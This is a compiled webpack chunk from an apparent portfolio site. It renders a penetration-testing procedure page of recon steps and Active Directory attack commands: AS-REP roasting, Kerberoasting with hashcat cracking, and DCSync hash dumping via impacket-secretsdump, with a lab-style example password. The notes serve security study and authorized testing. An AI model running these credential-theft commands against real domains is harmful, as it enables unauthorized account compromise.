"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[340],{4631:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>a,contentTitle:()=>c,default:()=>u,frontMatter:()=>i,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"procedure/Procedure","title":"Procedure","description":"1. Run begin.sh (basically autorecon)","source":"@site/docs/procedure/Procedure.md","sourceDirName":"procedure","slug":"/procedure/","permalink":"/portfolio/docs/procedure/","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1763789193000,"sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Procedure","permalink":"/portfolio/docs/category/procedure"},"next":{"title":"General","permalink":"/portfolio/docs/category/general"}}');var o=n(4848),t=n(8453);const i={sidebar_position:1},c=void 0,a={},d=[{value:"1. Run begin.sh (basically autorecon)",id:"1-run-beginsh-basically-autorecon",level:2},{value:"2. After nmap full port scan is done",id:"2-after-nmap-full-port-scan-is-done",level:2},{value:"3. After everything is done",id:"3-after-everything-is-done",level:2}];function l(e){const r={code:"code",h2:"h2",li:"li",p:"p",ul:"ul",...(0,t.R)(),...e.components},{Details:n}=r;return n||function(e,r){throw new Error("Expected "+(r?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(r.h2,{id:"1-run-beginsh-basically-autorecon",children:"1. Run begin.sh (basically autorecon)"}),"\n",(0,o.jsxs)(n,{children:[(0,o.jsxs)(r.p,{children:["While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Do ",(0,o.jsx)("a",{href:"./general/Connecting",children:"anonymous login"})," for any main services identified also."]}),(0,o.jsx)(r.p,{children:"If AD detected:"}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check for AS-REP roasting"}),"\n"]}),(0,o.jsx)(n,{children:(0,o.jsxs)(r.p,{children:["Run ",(0,o.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>"})," (eg ",(0,o.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>"}),"). Then run ",(0,o.jsx)(r.code,{children:'hashcat --help | grep -i "Kerberos"'})," and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run ",(0,o.jsx)(r.code,{children:"sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check for Kerberoasting (Requires user and plaintext password)"}),"\n"]}),(0,o.jsx)(n,{children:(0,o.jsxs)(r.p,{children:[(0,o.jsx)(r.code,{children:"sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>"})," then ",(0,o.jsx)(r.code,{children:"sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"[Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse (Requires user and plaintext password)"}),"\n"]}),(0,o.jsx)(n,{children:(0,o.jsxs)(r.p,{children:[(0,o.jsx)(r.code,{children:"impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip**>**"})," (eg ",(0,o.jsx)(r.code,{children:'impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\\!"@192.168.50.70'}),")"]})})]}),"\n",(0,o.jsx)(r.h2,{id:"2-after-nmap-full-port-scan-is-done",children:"2. After nmap full port scan is done"}),"\n",(0,o.jsxs)(n,{children:[(0,o.jsx)(r.p,{children:"List down all ports and prioritise which to look thru first."}),(0,o.jsx)(r.p,{children:"Add to to-do:"}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsxs)(r.li,{children:[(0,o.jsx)("a",{href:"./general/Connecting",children:"anonymous login"})," for any known services"]}),"\n",(0,o.jsx)(r.li,{children:"investigate unknown ports"}),"\n"]}),(0,o.jsx)(r.p,{children:"Look thru full nmap scan for any definitive versions and add that to software/versions list."})]}),"\n",(0,o.jsx)(r.h2,{id:"3-after-everything-is-done",children:"3. After everything is done"}),"\n",(0,o.jsx)(n,{children:(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check feroxbuster for HTTP ports"}),"\n",(0,o.jsx)(r.li,{children:"Check patterns for any new identified software or CVEs"}),"\n"]})})]})}function u(e={}){const{wrapper:r}={...(0,t.R)(),...e.components};return r?(0,o.jsx)(r,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},8453:(e,r,n)=>{n.d(r,{R:()=>i,x:()=>c});var s=n(6540);const o={},t=s.createContext(o);function i(e){const r=s.useContext(t);return s.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),s.createElement(t.Provider,{value:r},e.children)}}}]);